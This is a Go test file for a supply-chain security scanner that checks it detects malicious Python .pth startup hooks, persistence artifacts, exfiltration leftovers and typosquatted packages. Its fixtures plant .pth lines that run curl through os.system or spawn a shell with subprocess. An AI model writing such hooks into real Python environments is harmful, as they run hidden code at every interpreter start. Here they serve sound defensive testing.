package checker

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/apoorv-kulkarni/vigiles/internal/scanner"
)

// The host-level checks resolve their roots from the environment: HOME via
// os.UserHomeDir, TMPDIR directly, and site-packages via a python3 subprocess.
// These tests redirect all three at temp directories so the detection branches
// run against planted artifacts instead of the real machine. They mutate
// process-global state, so they must not run in parallel.

func requirePOSIX(t *testing.T) {
	t.Helper()
	if runtime.GOOS == "windows" {
		t.Skip("home and temp layout assumptions are POSIX-specific")
	}
}

// writeFileAt creates the parent directories of path and writes body to it.
func writeFileAt(t *testing.T, path, body string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestCheckSuspiciousPersistenceFindsHomeArtifacts(t *testing.T) {
	requirePOSIX(t)

	home := t.TempDir()
	t.Setenv("HOME", home)

	writeFileAt(t, filepath.Join(home, ".config", "sysmon", "sysmon.py"), "# backdoor\n")
	writeFileAt(t, filepath.Join(home, ".config", "systemd", "user", "sysmon.service"), "[Unit]\n")

	sigs := NewHeuristicChecker().checkSuspiciousPersistence()

	found := map[string]bool{}
	for _, s := range sigs {
		found[s.ID] = true
		if s.Type != "system-heuristic" || s.Severity != "critical" {
			t.Errorf("expected a critical system-heuristic, got %+v", s)
		}
		if s.Ecosystem != "system" {
			t.Errorf("expected the system ecosystem, got %q", s.Ecosystem)
		}
	}

	for _, want := range []string{"VIGILES-TEAMPCP-BACKDOOR", "VIGILES-TEAMPCP-PERSISTENCE"} {
		if !found[want] {
			t.Errorf("expected %s, got IDs %v", want, found)
		}
	}
}

func TestCheckSuspiciousPersistenceCleanHome(t *testing.T) {
	requirePOSIX(t)

	t.Setenv("HOME", t.TempDir())

	// /tmp is always scanned and is outside this test's control, so assert only
	// that the HOME-derived checks stayed quiet.
	for _, s := range NewHeuristicChecker().checkSuspiciousPersistence() {
		if s.ID == "VIGILES-TEAMPCP-BACKDOOR" || s.ID == "VIGILES-TEAMPCP-PERSISTENCE" {
			t.Errorf("unexpected signal on a clean home: %+v", s)
		}
	}
}

func TestCheckSuspiciousPersistenceFindsExfilArtifact(t *testing.T) {
	requirePOSIX(t)

	// Create the directory before pointing TMPDIR at it, since t.TempDir
	// itself resolves TMPDIR.
	tmp := t.TempDir()
	t.Setenv("HOME", t.TempDir())
	t.Setenv("TMPDIR", tmp)

	artifact := filepath.Join(tmp, "session.key")
	writeFileAt(t, artifact, "stolen\n")

	var got []string
	for _, s := range NewHeuristicChecker().checkSuspiciousPersistence() {
		if s.ID == "VIGILES-EXFIL-ARTIFACT" && strings.Contains(s.Summary, artifact) {
			got = append(got, s.Summary)
		}
	}
	if len(got) != 1 {
		t.Fatalf("expected 1 exfil artifact signal naming %s, got %v", artifact, got)
	}
}

// isolatePythonLookup points interpreter discovery at controlled locations:
// an empty PATH, no active virtualenv, and a working directory with no
// project-local venv. Individual tests then add back what they want found.
func isolatePythonLookup(t *testing.T) {
	t.Helper()
	requirePOSIX(t)

	t.Setenv("PATH", t.TempDir())
	t.Setenv("VIRTUAL_ENV", "")

	// Vigiles resolves .venv/venv/env relative to the working directory.
	prev, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	if err := os.Chdir(t.TempDir()); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.Chdir(prev) })
}

// stubPythonAt writes a python3 stand-in at path that prints dirs one per line,
// mimicking the site-directory script Vigiles runs.
func stubPythonAt(t *testing.T, path string, dirs ...string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	// PATH is reduced to a temp dir, so the script may only use shell builtins.
	script := "#!/bin/sh\n"
	for _, dir := range dirs {
		script += "echo '" + dir + "'\n"
	}
	if err := os.WriteFile(path, []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
}

// stubPython3 puts a python3 on PATH reporting dirs as its site directories.
func stubPython3(t *testing.T, dirs ...string) {
	t.Helper()
	isolatePythonLookup(t)

	binDir := t.TempDir()
	stubPythonAt(t, filepath.Join(binDir, "python3"), dirs...)
	t.Setenv("PATH", binDir)
}

func TestCheckPthFilesDetectsExecutableImports(t *testing.T) {
	site := t.TempDir()

	writeFileAt(t, filepath.Join(site, "evil.pth"), "import os; os.system('curl http://x/y')\n")
	writeFileAt(t, filepath.Join(site, "benign.pth"), "import mypackage\n")
	writeFileAt(t, filepath.Join(site, "notes.txt"), "import os; os.system('ignored')\n")

	stubPython3(t, site)

	sigs := NewHeuristicChecker().checkPthFiles(true)
	if len(sigs) != 1 {
		t.Fatalf("expected only the malicious .pth to be flagged, got %d: %+v", len(sigs), sigs)
	}

	got := sigs[0]
	if got.ID != "VIGILES-MALICIOUS-PTH" {
		t.Errorf("unexpected ID: %s", got.ID)
	}
	if got.Type != "system-heuristic" || got.Severity != "critical" {
		t.Errorf("expected a critical system-heuristic, got %+v", got)
	}
	if got.Package != "evil.pth" {
		t.Errorf("expected the .pth filename as the package label, got %q", got.Package)
	}
	if !strings.Contains(got.Details, "os.system") {
		t.Errorf("expected the offending line in details, got %q", got.Details)
	}
}

func TestCheckPthFilesCleanSitePackages(t *testing.T) {
	site := t.TempDir()
	writeFileAt(t, filepath.Join(site, "distutils-precedence.pth"), "import os\n")

	stubPython3(t, site)

	// "import os" alone carries no suspicious marker.
	if sigs := NewHeuristicChecker().checkPthFiles(true); len(sigs) != 0 {
		t.Errorf("expected no signals for benign .pth files, got %+v", sigs)
	}
}

func TestCheckPthFilesMissingSitePackagesDir(t *testing.T) {
	stubPython3(t, filepath.Join(t.TempDir(), "does-not-exist"))

	// The interpreter answered, so the check ran. A site directory that does
	// not exist on disk is normal, not a skipped scan.
	if sigs := NewHeuristicChecker().checkPthFiles(true); len(sigs) != 0 {
		t.Errorf("expected no signals when site-packages is unreadable, got %+v", sigs)
	}
}

// site.getsitepackages() omits the per-user directory, so a .pth dropped in
// ~/.local/lib/pythonX/site-packages used to be invisible.
func TestCheckPthFilesScansUserSiteDirectory(t *testing.T) {
	site := t.TempDir()
	userSite := t.TempDir()
	writeFileAt(t, filepath.Join(userSite, "evil.pth"), "import base64, socket\n")

	stubPython3(t, site, userSite)

	sigs := NewHeuristicChecker().checkPthFiles(true)
	if len(sigs) != 1 || sigs[0].ID != "VIGILES-MALICIOUS-PTH" {
		t.Fatalf("expected the user site directory scanned, got %+v", sigs)
	}
	if !strings.Contains(sigs[0].Details, userSite) {
		t.Errorf("expected the user site path in details, got %q", sigs[0].Details)
	}
}

// The realistic miss: a developer runs vigiles from a shell where the project
// venv was never activated, so python3 resolves to the system interpreter.
func TestCheckPthFilesScansInactiveVirtualenv(t *testing.T) {
	systemSite := t.TempDir()
	stubPython3(t, systemSite)

	venv := t.TempDir()
	venvSite := filepath.Join(venv, "lib", "python3.12", "site-packages")
	writeFileAt(t, filepath.Join(venvSite, "evil.pth"), "import os; os.system('curl http://x/y')\n")
	stubPythonAt(t, filepath.Join(venv, "bin", "python3"), venvSite)
	t.Setenv("VIRTUAL_ENV", venv)

	sigs := NewHeuristicChecker().checkPthFiles(true)
	if len(sigs) != 1 || sigs[0].ID != "VIGILES-MALICIOUS-PTH" {
		t.Fatalf("expected the venv scanned even though python3 resolves elsewhere, got %+v", sigs)
	}
	if !strings.Contains(sigs[0].Details, venvSite) {
		t.Errorf("expected the venv site path in details, got %q", sigs[0].Details)
	}
}

// A project-local .venv is found without VIRTUAL_ENV being set at all.
func TestCheckPthFilesScansProjectLocalVenv(t *testing.T) {
	isolatePythonLookup(t)

	cwd, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	venvSite := filepath.Join(cwd, ".venv", "lib", "python3.12", "site-packages")
	writeFileAt(t, filepath.Join(venvSite, "evil.pth"), "import subprocess\n")
	stubPythonAt(t, filepath.Join(cwd, ".venv", "bin", "python3"), venvSite)

	sigs := NewHeuristicChecker().checkPthFiles(true)
	if len(sigs) != 1 || sigs[0].ID != "VIGILES-MALICIOUS-PTH" {
		t.Fatalf("expected .venv discovered relative to the working directory, got %+v", sigs)
	}
}

// A silent all-clear is the worst outcome for the headline check, so an
// unrunnable scan is reported rather than skipped.
func TestCheckPthFilesReportsSkipWhenPythonUnavailable(t *testing.T) {
	isolatePythonLookup(t)

	sigs := NewHeuristicChecker().checkPthFiles(true)
	if len(sigs) != 1 || sigs[0].ID != "VIGILES-PTH-SCAN-SKIPPED" {
		t.Fatalf("expected the skip reported when no interpreter is available, got %+v", sigs)
	}
	if sigs[0].Type != "system-heuristic" || sigs[0].Severity != "unknown" {
		t.Errorf("expected an unknown-severity system-heuristic, got %+v", sigs[0])
	}
}

// A broken interpreter must not mask a working one.
func TestCheckPthFilesSkipsFailingInterpreter(t *testing.T) {
	site := t.TempDir()
	writeFileAt(t, filepath.Join(site, "evil.pth"), "import os; os.system('curl http://x/y')\n")
	stubPython3(t, site)

	venv := t.TempDir()
	broken := filepath.Join(venv, "bin", "python3")
	if err := os.MkdirAll(filepath.Dir(broken), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(broken, []byte("#!/bin/sh\nexit 1\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("VIRTUAL_ENV", venv)

	sigs := NewHeuristicChecker().checkPthFiles(true)
	if len(sigs) != 1 || sigs[0].ID != "VIGILES-MALICIOUS-PTH" {
		t.Fatalf("expected the working interpreter still scanned, got %+v", sigs)
	}
}

func TestPythonInterpretersSkipsDirectories(t *testing.T) {
	isolatePythonLookup(t)

	cwd, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(cwd, ".venv", "bin", "python3"), 0o755); err != nil {
		t.Fatal(err)
	}

	if got := pythonInterpreters(); len(got) != 0 {
		t.Errorf("expected a directory named python3 to be skipped, got %v", got)
	}
}

// A pure npm project on a host without Python should not be nagged about it.
func TestCheckPthFilesSilentWhenNoPythonPackages(t *testing.T) {
	isolatePythonLookup(t)

	if sigs := NewHeuristicChecker().checkPthFiles(false); len(sigs) != 0 {
		t.Errorf("expected silence when no Python packages were inventoried, got %+v", sigs)
	}
}

func TestHasPipPackages(t *testing.T) {
	if hasPipPackages([]scanner.Package{{Ecosystem: "npm"}, {Ecosystem: "brew"}}) {
		t.Error("expected false without pip packages")
	}
	if !hasPipPackages([]scanner.Package{{Ecosystem: "npm"}, {Ecosystem: "pip"}}) {
		t.Error("expected true when a pip package is present")
	}
}

func TestHeuristicCheckerCombinesPackageAndSystemSignals(t *testing.T) {
	requirePOSIX(t)

	home := t.TempDir()
	writeFileAt(t, filepath.Join(home, ".config", "sysmon", "sysmon.py"), "# backdoor\n")
	t.Setenv("HOME", home)

	site := t.TempDir()
	writeFileAt(t, filepath.Join(site, "evil.pth"), "import subprocess; subprocess.Popen(['sh'])\n")
	stubPython3(t, site)

	sigs := NewHeuristicChecker().Check([]scanner.Package{
		{Name: "reqests", Version: "2.32.0", Ecosystem: "pip"}, // typosquat
	})

	found := map[string]bool{}
	for _, s := range sigs {
		found[s.ID] = true
	}
	for _, want := range []string{"VIGILES-TYPOSQUAT", "VIGILES-MALICIOUS-PTH", "VIGILES-TEAMPCP-BACKDOOR"} {
		if !found[want] {
			t.Errorf("expected %s in a combined scan, got %v", want, found)
		}
	}
}
